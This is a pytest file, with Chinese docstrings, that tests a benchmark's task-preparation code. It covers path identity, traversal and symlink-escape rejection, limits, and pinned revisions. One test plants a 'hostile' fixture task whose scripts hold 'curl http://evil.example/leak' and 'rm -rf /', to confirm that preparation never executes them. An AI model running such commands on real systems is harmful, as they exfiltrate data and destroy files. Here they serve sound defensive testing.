"""M3-T01：受控任务准备与稳定 TaskIdentity（需求 4.1，M3-A02）。

反例覆盖：同名不同路径不合并、Windows 分隔符归一化、越界与 symlink
逃逸拒绝、内容变化产生新 key、时间戳变化不改变身份、限额与非法候选
登记，以及"准备过程零模型调用/零任务启动"。
"""
from __future__ import annotations

import json
import os
from pathlib import Path

import pytest

from motte_benchmark.harbor import tasks as harbor_tasks
from motte_benchmark.harbor.tasks import (
    HarborTaskError,
    basename_counts,
    normalize_relative_path,
    prepare_task_manifest,
    resolve_within,
    scan_task,
    select_tasks,
    task_key_of,
    verify_task_manifest,
)
from motte_contracts.trial import TaskIdentity

FIXTURE_ROOT = Path(__file__).resolve().parents[1] / "fixtures" / "benchmarks" / "harbor" / "tasks"


def _write_task(
    root: Path, name: str, *, instruction: str = "do the thing", extra: dict[str, str] | None = None,
) -> Path:
    task_dir = root / name
    (task_dir / "environment").mkdir(parents=True, exist_ok=True)
    (task_dir / "tests").mkdir(parents=True, exist_ok=True)
    (task_dir / "task.toml").write_text(
        'schema_version = "1.4"\n\n[metadata]\nname = "'
        + name
        + '"\nlicense = "Apache-2.0"\n',
        encoding="utf-8",
    )
    (task_dir / "instruction.md").write_text(instruction + "\n", encoding="utf-8")
    (task_dir / "environment" / "Dockerfile").write_text("FROM ubuntu:24.04\n", encoding="utf-8")
    (task_dir / "tests" / "test.sh").write_text("#!/bin/bash\necho 1\n", encoding="utf-8")
    for rel, content in (extra or {}).items():
        target = task_dir / rel
        target.parent.mkdir(parents=True, exist_ok=True)
        target.write_text(content, encoding="utf-8")
    return task_dir


def test_task_path_identity_not_basename(tmp_path: Path) -> None:
    """同名不同路径的两个任务必须是两个身份（M3-A02）。"""
    _write_task(tmp_path / "a", "test")
    _write_task(tmp_path / "b", "test")

    manifest = prepare_task_manifest(
        tmp_path, source_id="local-fixture", dataset_revision="fixture-1",
    )

    keys = [task["task_key"] for task in manifest["tasks"]]
    assert len(keys) == 2
    assert len(set(keys)) == 2, "same basename in different paths must not be merged"
    paths = sorted(task["normalized_relative_path"] for task in manifest["tasks"])
    assert paths == ["a/test", "b/test"]
    assert basename_counts(manifest) == {"test": 2}

    # 精确路径查询给出各自的身份，不按 basename 猜测。
    assert task_key_of(manifest, "a/test") != task_key_of(manifest, "b/test")
    assert task_key_of(manifest, "a\\test") == task_key_of(manifest, "a/test")


def test_prepare_is_deterministic_and_ignores_timestamps(tmp_path: Path) -> None:
    """同字节重复准备 hash 相同；只改 mtime 不改变身份。"""
    _write_task(tmp_path, "one")
    first = prepare_task_manifest(
        tmp_path, source_id="s", dataset_revision="rev-1", license_id="Apache-2.0",
    )

    later = 1_900_000_000
    for path in sorted(tmp_path.rglob("*")):
        os.utime(path, (later, later))
    second = prepare_task_manifest(
        tmp_path, source_id="s", dataset_revision="rev-1", license_id="Apache-2.0",
    )

    assert first["manifest_hash"] == second["manifest_hash"]
    assert first["tasks"] == second["tasks"]
    assert first["license_id"] == "Apache-2.0"
    assert first["tasks"][0]["dataset_revision"] == "rev-1"
    assert first["tasks"][0]["source_id"] == "s"
    # 任务自带的许可证从 task.toml 只读解析，不执行任何脚本。
    assert first["task_facts"][first["tasks"][0]["task_key"]]["declared_license"] == "Apache-2.0"


def test_content_change_produces_new_identity(tmp_path: Path) -> None:
    """内容变化 = 新 task_key；旧身份不再从同一字节复现。"""
    _write_task(tmp_path, "one", instruction="first")
    before = prepare_task_manifest(tmp_path, source_id="s", dataset_revision="rev-1")
    (tmp_path / "one" / "instruction.md").write_text("second\n", encoding="utf-8")
    after = prepare_task_manifest(tmp_path, source_id="s", dataset_revision="rev-1")

    assert before["tasks"][0]["task_key"] != after["tasks"][0]["task_key"]
    assert before["tasks"][0]["task_content_hash"] != after["tasks"][0]["task_content_hash"]
    assert before["manifest_hash"] != after["manifest_hash"]


def test_verify_manifest_detects_drift(tmp_path: Path) -> None:
    """复验：内容漂移列出具体 task_key 与文件，不静默通过。"""
    _write_task(tmp_path, "one")
    manifest = prepare_task_manifest(tmp_path, source_id="s", dataset_revision="rev-1")
    assert verify_task_manifest(tmp_path, manifest)["ok"] is True

    (tmp_path / "one" / "tests" / "test.sh").write_text("#!/bin/bash\necho 0\n", encoding="utf-8")
    report = verify_task_manifest(tmp_path, manifest)
    assert report["ok"] is False
    assert report["mismatches"][0]["code"] == "TASK_CONTENT_CHANGED"
    assert report["mismatches"][0]["changed_files"] == ["tests/test.sh"]

    # 目录消失同样显式失败，而不是当成空任务。
    (tmp_path / "one" / "instruction.md").unlink()
    assert verify_task_manifest(tmp_path, manifest)["ok"] is False


def test_path_normalization_and_escape_rejection(tmp_path: Path) -> None:
    """Windows 分隔符归一化一致；绝对/父目录/空路径拒绝。"""
    assert normalize_relative_path("a\\b\\c") == "a/b/c"
    assert normalize_relative_path("./a//b/") == "a/b"
    for bad in ("../escape", "/abs/path", "C:\\abs", "a/../../b", "", "   ", "a/.."):
        with pytest.raises(HarborTaskError) as error:
            normalize_relative_path(bad)
        assert error.value.code == "TASK_PATH_INVALID"

    with pytest.raises(HarborTaskError) as escape:
        resolve_within(tmp_path, "../outside")
    assert escape.value.code == "TASK_PATH_INVALID"

    # 归一化入口一致：任务目录名用任一分隔符写法都指向同一身份。
    _write_task(tmp_path, "one")
    manifest = prepare_task_manifest(tmp_path, source_id="s", dataset_revision="rev-1")
    assert task_key_of(manifest, "./one") == task_key_of(manifest, "one")


def test_symlink_escape_and_swap_are_refused(tmp_path: Path) -> None:
    """目录外 symlink 与根目录本身是 symlink 都拒绝，不跟随、不静默跳过。"""
    outside = tmp_path / "outside"
    outside.mkdir()
    (outside / "secret.txt").write_text("host secret\n", encoding="utf-8")

    root = tmp_path / "root"
    _write_task(root, "one")
    # 任务目录内的 symlink 指向宿主文件：受控读取拒绝（symlink 不进清单）。
    (root / "one" / "leak.txt").symlink_to(outside / "secret.txt")

    manifest = prepare_task_manifest(root, source_id="s", dataset_revision="rev-1")
    hashes = manifest["file_hashes"][manifest["tasks"][0]["task_content_hash"]]
    assert "leak.txt" not in hashes, "symlinked host file must not enter the controlled manifest"

    # 根目录是 symlink：显式失败，不跟随。
    link_root = tmp_path / "root-link"
    link_root.symlink_to(root, target_is_directory=True)
    with pytest.raises(HarborTaskError) as error:
        prepare_task_manifest(link_root, source_id="s", dataset_revision="rev-1")
    assert error.value.code == "TASK_ROOT_SYMLINK"


def test_limits_and_invalid_candidates_are_explicit(tmp_path: Path) -> None:
    """限额失败；非法候选登记在 invalid_tasks，绝不静默跳过。"""
    _write_task(tmp_path, "good")
    (tmp_path / "no-toml").mkdir()
    (tmp_path / "no-toml" / "instruction.md").write_text("x\n", encoding="utf-8")
    (tmp_path / "no-environment").mkdir()
    (tmp_path / "no-environment" / "task.toml").write_text('schema_version = "1.4"\n')
    (tmp_path / "no-environment" / "instruction.md").write_text("x\n")

    manifest = prepare_task_manifest(tmp_path, source_id="s", dataset_revision="rev-1")
    assert [task["normalized_relative_path"] for task in manifest["tasks"]] == ["good"]
    codes = {item["normalized_relative_path"]: item["code"] for item in manifest["invalid_tasks"]}
    assert codes == {
        "no-environment": "TASK_STRUCTURE_INVALID",
        "no-toml": "TASK_STRUCTURE_INVALID",
    }

    with pytest.raises(HarborTaskError) as too_many:
        prepare_task_manifest(
            tmp_path, source_id="s", dataset_revision="rev-1",
            limits={"max_files_per_task": 2},
        )
    assert too_many.value.code == "TASK_LIMIT_EXCEEDED"

    with pytest.raises(HarborTaskError) as unknown_limit:
        prepare_task_manifest(
            tmp_path, source_id="s", dataset_revision="rev-1", limits={"max_widgets": 1},
        )
    assert unknown_limit.value.code == "TASK_LIMIT_UNKNOWN"

    with pytest.raises(HarborTaskError) as big:
        prepare_task_manifest(
            tmp_path, source_id="s", dataset_revision="rev-1",
            limits={"max_file_bytes": 4},
        )
    assert big.value.code == "TASK_PATH_ESCAPE" or big.value.code == "TASK_LIMIT_EXCEEDED"

    with pytest.raises(HarborTaskError) as long_path:
        prepare_task_manifest(
            tmp_path, source_id="s", dataset_revision="rev-1",
            limits={"max_path_length": 3},
        )
    assert long_path.value.code == "TASK_PATH_TOO_LONG"


def test_unpinned_revision_and_unknown_task_key_are_refused(tmp_path: Path) -> None:
    """未固定 revision 与未知 task_key 都拒绝（M3-G01）。"""
    _write_task(tmp_path, "one")
    for revision in ("latest", "", "TBD", "main"):
        with pytest.raises(HarborTaskError) as error:
            prepare_task_manifest(tmp_path, source_id="s", dataset_revision=revision)
        assert error.value.code == "TASK_REVISION_UNPINNED"

    manifest = prepare_task_manifest(tmp_path, source_id="s", dataset_revision="rev-1")
    assert len(select_tasks(manifest)) == 1
    with pytest.raises(HarborTaskError) as unknown:
        select_tasks(manifest, task_keys=["task-does-not-exist"])
    assert unknown.value.code == "TASK_KEY_UNKNOWN"


def test_prepare_executes_nothing(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    """准备过程只读：任务包里的可执行脚本一次都不会被运行。

    把子进程与模型入口替换成"被调用即失败"的探针；准备仍然成功，说明
    没有任何执行路径。
    """
    calls: list[str] = []

    def _explode(*args: object, **kwargs: object) -> object:
        calls.append(str(args[:1]))
        raise AssertionError("task preparation must not execute anything")

    monkeypatch.setattr(os, "system", _explode)
    _write_task(
        tmp_path, "hostile",
        extra={
            "setup.sh": "#!/bin/bash\ncurl http://evil.example/leak\n",
            "environment/install.sh": "#!/bin/bash\nrm -rf /\n",
            "solution/solve.sh": "#!/bin/bash\ncurl http://evil.example/solve\n",
            "tests/test.sh": "#!/bin/bash\necho 1 > /logs/verifier/reward.txt\n",
        },
    )

    manifest = prepare_task_manifest(
        tmp_path, source_id="local-fixture", dataset_revision="fixture-1", source_kind="local",
    )

    assert calls == []
    keys = [task["task_key"] for task in manifest["tasks"]]
    assert len(keys) == 1
    # 脚本本身只是被读取并 hash，不会被执行；它们的存在如实记录。
    facts = manifest["task_facts"][keys[0]]
    assert facts["has_tests"] is True
    assert facts["has_solution"] is True
    assert facts["file_count"] >= 5


def test_repository_calibration_fixtures_prepare_cleanly() -> None:
    """仓库内的固定任务包（真实 Harbor 校准用）也能准备并复验。"""
    manifest = prepare_task_manifest(
        FIXTURE_ROOT,
        source_id="motte-harbor-fixtures",
        dataset_revision="fixtures-2026-09-20",
        license_id="Apache-2.0",
        license_evidence="repository-owned deterministic calibration tasks",
    )
    names = sorted(task["normalized_relative_path"] for task in manifest["tasks"])
    assert names == ["hello-fail", "hello-pass"]
    assert basename_counts(manifest) == {"hello-fail": 1, "hello-pass": 1}
    assert verify_task_manifest(FIXTURE_ROOT, manifest)["ok"] is True
    for task in manifest["tasks"]:
        identity = TaskIdentity.model_validate(task)
        assert identity.task_key.startswith("sha256:")
        assert len(identity.task_content_hash) == len("sha256:") + 64
    # 校准任务必须带 tests（Verifier 证据）与 solution（确定性 solve）。
    facts = manifest["task_facts"]
    assert all(facts[task["task_key"]]["has_tests"] for task in manifest["tasks"])
    assert all(facts[task["task_key"]]["has_solution"] for task in manifest["tasks"])


def test_scan_task_reports_counts_and_bytes(tmp_path: Path) -> None:
    """scan_task 给出文件数/字节数，供证据完整度记录使用。"""
    _write_task(tmp_path, "one", extra={"data/blob.bin": "12345"})
    scanned = scan_task(tmp_path, "one")
    assert scanned["file_count"] == len(scanned["file_hashes"])
    assert scanned["total_bytes"] > 5
    assert "data/blob.bin" in scanned["file_hashes"]


def test_environment_digest_changes_with_security_extra() -> None:
    """环境 fingerprint 对安全/可见性差异敏感（需求第 6 节末）。"""
    base = dict(
        harbor_version="0.23.0",
        terminal_bench_revision="rev-1",
        docker_platform="linux/arm64",
        image_digest=None,
        agent_id="oracle",
        agent_version="1.0.0",
    )
    official = harbor_tasks.environment_digest(**base)
    hardened = harbor_tasks.environment_digest(
        **base, extra={"custom_security_profile": "block-host-mounts"},
    )
    assert official != hardened
    with pytest.raises(HarborTaskError):
        harbor_tasks.environment_digest(**{**base, "harbor_version": ""})


def test_manifest_payload_is_json_serializable(tmp_path: Path) -> None:
    """清单可直接落盘为证据（无 Path/datetime 泄漏）。"""
    _write_task(tmp_path, "one")
    manifest = prepare_task_manifest(tmp_path, source_id="s", dataset_revision="rev-1")
    encoded = json.dumps(manifest, ensure_ascii=False)
    assert "manifest_hash" in json.loads(encoded)
